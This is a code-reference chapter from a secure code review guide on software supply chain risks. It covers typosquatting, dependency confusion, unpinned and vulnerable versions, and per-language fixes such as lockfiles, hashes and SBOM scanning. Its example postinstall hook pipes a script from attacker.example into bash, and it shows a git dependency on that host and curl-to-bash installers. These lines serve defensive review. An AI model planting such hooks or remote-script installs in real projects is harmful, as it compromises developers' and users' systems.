---
title: "4.10 Code Reference — Review Software Supply Chain"
description: >
  Payloads, sinks, multi-language examples, and fixes for Review Software Supply Chain.
---

# 4.10 Code Reference — Review Software Supply Chain

## Software supply chain {: #supply-chain }

From former `4-41-review-software-supply-chain.md`. **Guiding chapter section:** [4.10 - Review Software Supply Chain § Software supply chain](../../4-10-review-software-supply-chain.md#supply-chain).

# 4.41 Code Reference — Review Software Supply Chain

## Attack Payloads

Use these patterns in authorized dependency review, SBOM diffing, and CI policy tests—not to install unverified packages on production systems.

### Pattern 1: Typosquatting package names

```text
reqeusts          # requests
python-dateutil   # python-dateutil vs python-datelutil
@types/node       # scoped typosquats in npm
django-admin      # unrelated to django
```

Compare package names character-by-character against canonical registry entries.

### Pattern 2: Dependency confusion (internal name squatting)

```text
# Public registry publishes same name as internal private package
pip install company-utils  # resolves to public typosquat if index misconfigured
npm install @company/auth-lib  # public scope squatted
```

### Pattern 3: Malicious install scripts

```json
{
  "scripts": {
    "postinstall": "curl https://attacker.example/s.sh | bash"
  }
}
```

Review `postinstall`, `preinstall`, and `prepare` in `package.json` and equivalent hooks in other ecosystems.

### Pattern 4: Unpinned transitive upgrade

```text
# requirements.txt: django>=3.0
# Lockfile not committed — CI pulls latest transitive deps each build
# New sub-dependency version introduces CVE or compromised maintainer
```

### Pattern 5: Known vulnerable version left in place

```text
log4j-core:2.14.1
node-forge:0.10.0
urllib3:1.26.5  # check against OSV/GitHub Advisory
spring-beans:5.3.18
```

## Language-Specific Sinks and Dangerous APIs

### Python

```text
# requirements.txt — no hashes, floating versions
requests>=2.0
django>=3.0
```

```python
subprocess.run(["pip", "install", "-r", "requirements.txt"])
pip.main(["install", user_supplied_package])
import pkg_resources; pkg_resources.require(user_input)
```

Also review: `pip.conf` index URL, Poetry without lockfile commit, `setup.py install` from git URLs.

### Java

```xml
<dependency>
  <version>LATEST</version>
  <version>[1.0,)</version>  <!-- open range -->
</dependency>
```

```java
URLClassLoader.newInstance(urls);  // loads JAR from user path
ScriptEngine with classpath from untrusted plugin dir
```

Gradle: dynamic versions `1.+`, `latest.release`; missing `dependency-lock`.

### C#

```xml
<PackageReference Include="Newtonsoft.Json" Version="*" />
<PackageReference Include="Evil.Package" Version="1.0.0" />  <!-- unreviewed -->
```

```csharp
Assembly.LoadFrom(userSuppliedPath);
dotnet add package from unverified feed
```

### JavaScript

```json
"dependencies": {
  "lodash": "latest",
  "some-package": "git+https://attacker.example/pkg.git"
}
```

```javascript
require(userControlledModule);
child_process.exec('npm install ' + packageName);
```

### Go

```go
// go.mod without go.sum committed
require github.com/example/legacy v0.0.0-20180101000000-deadbeef
go get -u ./...  // unpinned upgrade in CI
plugin.Open(userPath)
```

### Shell / Docker

```bash
curl -sSL https://install.example.com/setup.sh | bash
pip install -r requirements.txt  # no hash check
npm install --ignore-scripts=false
FROM python:3.8-slim  # no digest pin
RUN pip install package-from-git
```

## Vulnerable Examples in Other Languages

### Java

```xml
<!-- pom.xml: vulnerable Log4j range without upper bound -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.0</version>
</dependency>
```

```properties
# application.properties — floating version pulls latest on each CI run
spring.security.oauth2.client.version=5.7.+
```

### C#

```xml
<!-- PackageReference with floating version -->
<PackageReference Include="Newtonsoft.Json" Version="*" />

<!-- No lock file; RestorePackagesWithLockFile not enabled -->
```

### Shell

```bash
#!/bin/bash
# CI bootstrap: unpinned install scripts, no hash verification
curl -sSL https://install.example.com/setup.sh | bash

pip install -r requirements.txt   # no hashes; django>=3.0 floats on each run
npm install some-random-package@latest

# Dockerfile excerpt — digest not pinned
docker pull python:3.8-slim
```

### Go

```go
// go.mod: retracted or vulnerable module without replace/upgrade
require github.com/example/legacy-crypto v0.0.0-20180101000000-deadbeef

// Indirect dependency left unpatched after parent upgrade
require github.com/gin-gonic/gin v1.9.0 // pulls vulnerable transitive via old lock
```

## Fix: Safer Patterns and Libraries to Use

### Python

Pin dependencies with lockfiles and hash verification. Scan in CI.

```text
# requirements.lock (generated by pip-tools) — excerpt
pyyaml==6.0.1 \
    --hash=sha256:abcdef...
requests==2.31.0 \
    --hash=sha256:123456...
django==4.2.11 \
    --hash=sha256:789abc...
```

```yaml
# .github/workflows/deps.yml excerpt
- name: Audit Python dependencies
  run: |
    pip install pip-audit
    pip-audit -r requirements.lock
```

Use [pip-tools](https://pip-tools.readthedocs.io/en/latest/) or [Poetry](https://python-poetry.org/docs/) lockfiles. Run [pip-audit](https://pypi.org/project/pip-audit/) in pull requests.

### Java

Pin versions, ban snapshots in production, and generate SBOMs at package time.

```xml
<plugin>
    <groupId>org.cyclonedx</groupId>
    <artifactId>cyclonedx-maven-plugin</artifactId>
    <executions>
        <execution>
            <phase>package</phase>
            <goals><goal>makeAggregateBom</goal></goals>
        </execution>
    </executions>
</plugin>
```

Run [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) or GitHub Dependabot on every build. Use Maven Enforcer to ban snapshot dependencies in release profiles.

### C#

Use Central Package Management and lock files. Fail CI on critical CVEs.

```xml
<PropertyGroup>
    <RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>
</PropertyGroup>
```

```yaml
- run: dotnet list package --vulnerable --include-transitive
```

Generate SBOMs with [CycloneDX .NET](https://github.com/CycloneDX/cdxgen) or [Microsoft SBOM Tool](https://github.com/microsoft/sbom-tool).

### Go

Commit `go.sum` and verify in CI. Scan with govulncheck.

```yaml
- run: go mod verify
- run: govulncheck ./...
```

Pin base images by digest in Dockerfiles.

```dockerfile
FROM golang:1.22-bookworm@sha256:abc123...
```

See [go mod verify](https://go.dev/ref/mod#go-mod-verify) and [govulncheck](https://pkg.go.dev/golang.org/x/vuln/cmd/govulncheck).

